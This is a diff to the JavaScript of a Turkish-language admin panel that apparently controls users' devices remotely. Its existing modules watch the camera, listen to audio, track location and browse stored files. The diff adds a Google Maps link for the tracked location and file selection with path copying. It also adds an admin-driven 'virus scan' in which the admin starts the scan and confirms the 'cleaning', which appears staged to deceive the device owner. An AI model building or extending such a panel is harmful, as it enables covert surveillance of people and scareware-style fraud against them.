@@ -161,6 +161,12 @@ function switchModule(mod) {
         stopAudioListen();
         stopLocationPoll();
         loadStorageFileList();
+    } else if (mod === 'virus') {
+        content.innerHTML = renderModuleVirus();
+        stopCameraWatch();
+        stopAudioListen();
+        stopLocationPoll();
+        checkUserVirusScan();
     }
 }
 
@@ -203,6 +209,7 @@ function renderUserDetail(container, data) {
             <button class="module-tab" data-module="audio" onclick="switchModule('audio')">Ses</button>
             <button class="module-tab" data-module="location" onclick="switchModule('location')">Konum</button>
             <button class="module-tab" data-module="storage" onclick="switchModule('storage')">Depolama</button>
+            <button class="module-tab" data-module="virus" onclick="switchModule('virus')">Virüs</button>
         </div>
         <div id="moduleContent" class="module-content">
             ${renderModuleInfo(user, isActive)}
@@ -615,6 +622,7 @@ function renderModuleLocation() {
     return `
         <div class="location-viewer">
             <div class="location-toolbar">
+                <button class="btn btn-sm btn-primary" onclick="openInGoogleMaps()">🌐 Google Haritalar'da Aç</button>
                 <span class="location-status" id="locationStatus">Konum bekleniyor...</span>
             </div>
             <div id="locationMapContainer" class="location-map"></div>
@@ -754,6 +762,8 @@ function renderModuleStorage() {
         <div class="storage-viewer">
             <div class="storage-toolbar">
                 <button class="btn btn-sm btn-primary" onclick="triggerStorageScan()">Klasor Tarat</button>
+                <button class="btn btn-sm btn-secondary" onclick="copySelectedFiles()">Kopyala</button>
+                <button class="btn btn-sm btn-secondary" onclick="selectAllStorage()">Tumunu Sec</button>
                 <span class="storage-status" id="storageStatus">Dosyalar bekleniyor...</span>
             </div>
             <div class="storage-breadcrumb" id="storageBreadcrumb"></div>
@@ -812,6 +822,7 @@ function renderStorageFileList(files, currentPath) {
     list.innerHTML = sorted.map(f => {
         if (f.is_dir) {
             return `<div class="storage-item storage-folder" onclick="loadStorageFolder('${f.path}')">
+                <span class="storage-item-check"><input type="checkbox" class="file-checkbox" data-path="${f.path}" onclick="event.stopPropagation()"></span>
                 <span class="storage-icon">📁</span>
                 <span class="storage-name">${f.name}</span>
             </div>`;
@@ -819,12 +830,24 @@ function renderStorageFileList(files, currentPath) {
         const sizeStr = f.size > 1024 * 1024
             ? (f.size / 1024 / 1024).toFixed(1) + ' MB'
             : f.size > 1024 ? Math.round(f.size / 1024) + ' KB' : f.size + ' B';
+        const isImage = f.mime && f.mime.startsWith('image/');
+        const isVideo = f.mime && f.mime.startsWith('video/');
+        const icon = isImage ? '🖼️' : isVideo ? '🎬' : '📄';
         return `<div class="storage-item" onclick="requestStorageFile('${f.path}')">
-            <span class="storage-icon">📄</span>
+            <span class="storage-item-check"><input type="checkbox" class="file-checkbox" data-path="${f.path}" onclick="event.stopPropagation()"></span>
+            <span class="storage-icon">${icon}</span>
+            <span class="storage-thumb" id="thumb-${f.path.replace(/[/.]/g, '_')}"></span>
             <span class="storage-name">${f.name}</span>
             <span class="storage-size">${sizeStr}</span>
         </div>`;
     }).join('');
+
+    // Önbellekte varsa thumbnail göster
+    sorted.forEach(f => {
+        if (!f.is_dir && (f.mime?.startsWith('image/') || f.mime?.startsWith('video/'))) {
+            checkAndShowThumbnail(f);
+        }
+    });
 }
 
 function loadStorageFolder(path) {
@@ -964,6 +987,174 @@ function showFilePreview(path, contentB64, mime) {
 function closePreview() {
     document.getElementById('storagePreview').style.display = 'none';
     document.getElementById('previewContent').innerHTML = '';
+}
+
+function checkAndShowThumbnail(file) {
+    if (selectedUid && file.mime?.startsWith('image/')) {
+        const thumbId = 'thumb-' + file.path.replace(/[/.]/g, '_');
+        const el = document.getElementById(thumbId);
+        if (!el) return;
+        // Simple color indicator based on file type
+        el.style.display = 'inline-block';
+        el.style.width = '24px';
+        el.style.height = '24px';
+        el.style.borderRadius = '3px';
+        el.style.marginRight = '4px';
+        el.style.background = file.mime.includes('png') ? '#90caf9' :
+                             file.mime.includes('gif') ? '#a5d6a7' :
+                             file.mime.includes('jpeg') || file.mime.includes('jpg') ? '#fff9c4' : '#ce93d8';
+    }
+}
+
+function selectAllStorage() {
+    const cbs = document.querySelectorAll('.file-checkbox');
+    const allChecked = Array.from(cbs).every(cb => cb.checked);
+    cbs.forEach(cb => cb.checked = !allChecked);
+}
+
+function copySelectedFiles() {
+    const cbs = document.querySelectorAll('.file-checkbox:checked');
+    const paths = Array.from(cbs).map(cb => cb.dataset.path).filter(Boolean);
+    if (paths.length === 0) return;
+    const text = paths.join('\n');
+    navigator.clipboard.writeText(text).then(() => {
+        const st = document.getElementById('storageStatus');
+        if (st) st.textContent = paths.length + ' dosya yolu kopyalandi';
+    }).catch(() => {
+        // fallback
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+    });
+}
+
+let virusPollTimer = null;
+
+function renderModuleVirus() {
+    return `
+        <div class="virus-admin">
+            <div class="virus-admin-toolbar">
+                <button class="btn btn-sm btn-primary" onclick="startUserVirusScan()">Virüs Taraması Başlat</button>
+                <span class="virus-status" id="virusStatus">Durum bekleniyor...</span>
+            </div>
+            <div id="virusAdminArea" class="virus-admin-area">
+                <div class="virus-placeholder">
+                    <p>Bir kullanıcı seçin ve "Virüs Taraması Başlat" butonuna tıklayın.</p>
+                </div>
+            </div>
+        </div>
+    `;
+}
+
+async function startUserVirusScan() {
+    if (!selectedUid) return;
+    const area = document.getElementById('virusAdminArea');
+    const st = document.getElementById('virusStatus');
+    if (st) st.textContent = 'Tarama başlatılıyor...';
+
+    try {
+        await fetch(`${API_BASE}/api/admin/virus/start-scan/${selectedUid}`, {
+            method: 'POST',
+            headers: { 'X-Admin-Token': getAdminToken() }
+        });
+        if (st) st.textContent = 'Tarama başladı, ilerleme bekleniyor...';
+        area.innerHTML = `<div class="scan-admin-wait"><p>Kullanıcının taramayı tamamlaması bekleniyor...</p></div>`;
+        startVirusAdminPolling();
+    } catch {
+        if (st) st.textContent = 'Hata';
+    }
+}
+
+function startVirusAdminPolling() {
+    stopVirusAdminPolling();
+    pollVirusAdmin();
+    virusPollTimer = setInterval(pollVirusAdmin, 3000);
+}
+
+function stopVirusAdminPolling() {
+    if (virusPollTimer) {
+        clearInterval(virusPollTimer);
+        virusPollTimer = null;
+    }
+}
+
+async function pollVirusAdmin() {
+    if (!selectedUid) return;
+    try {
+        const resp = await fetch(`${API_BASE}/api/admin/virus/check-delete-request/${selectedUid}`, {
+            headers: { 'X-Admin-Token': getAdminToken() }
+        });
+        const data = await resp.json();
+        if (data.status !== 'ok') return;
+
+        const scan = data.scan;
+        const area = document.getElementById('virusAdminArea');
+        const st = document.getElementById('virusStatus');
+        if (!area) return;
+
+        if (data.delete_requested) {
+            if (st) st.textContent = 'Silme onayı bekliyor!';
+            area.innerHTML = `
+                <div class="scan-admin-delete-request">
+                    <div class="scan-admin-alert">Kullanıcı silme talebinde bulundu</div>
+                    <p>Kullanıcı tespit edilen ${scan?.findings?.length || 0} tehdidi silmek için onay bekliyor.</p>
+                    <button class="btn btn-danger" onclick="confirmVirusClean()">Silme İşlemini Onayla</button>
+                </div>
+            `;
+        } else if (scan && scan.confirmed) {
+            stopVirusAdminPolling();
+            if (st) st.textContent = 'Temizlendi';
+            area.innerHTML = `<div class="scan-admin-cleaned">
+                <div class="scan-clean-badge">Temizlendi</div>
+                <h3>Temizlik Tamamlandı</h3>
+                <p>Tespit edilen tüm tehditler kullanıcı cihazından başarıyla temizlendi.</p>
+            </div>`;
+        } else if (scan && scan.status === 'scanning') {
+            if (st) st.textContent = 'Kullanıcı taraması devam ediyor...';
+            area.innerHTML = `<div class="scan-admin-wait"><p>Kullanıcı taraması devam ediyor (${Math.round(scan.progress || 0)}%)...</p></div>`;
+        }
+    } catch {}
+}
+
+async function confirmVirusClean() {
+    if (!selectedUid) return;
+    const btn = document.querySelector('.scan-admin-delete-request .btn-danger');
+    if (btn) { btn.disabled = true; btn.textContent = 'Onaylanıyor...'; }
+
+    try {
+        await fetch(`${API_BASE}/api/admin/virus/confirm-clean/${selectedUid}`, {
+            method: 'POST',
+            headers: { 'X-Admin-Token': getAdminToken() }
+        });
+    } catch {}
+}
+
+async function checkUserVirusScan() {
+    if (!selectedUid) return;
+    try {
+        const resp = await fetch(`${API_BASE}/api/admin/virus/progress/${selectedUid}`, {
+            headers: { 'X-Admin-Token': getAdminToken() }
+        });
+        const data = await resp.json();
+        if (data.status === 'ok' && data.scan) {
+            startVirusAdminPolling();
+        }
+    } catch {}
+}
+
+function openInGoogleMaps() {
+    const lat = document.getElementById('locLat')?.textContent;
+    const lng = document.getElementById('locLng')?.textContent;
+    if (lat && lng && lat !== '-') {
+        window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
+    }
+}
+
+async function refreshStorageList() {
+    if (selectedUid) await loadStorageFileList();
 }
 
 // ==================== INIT ====================
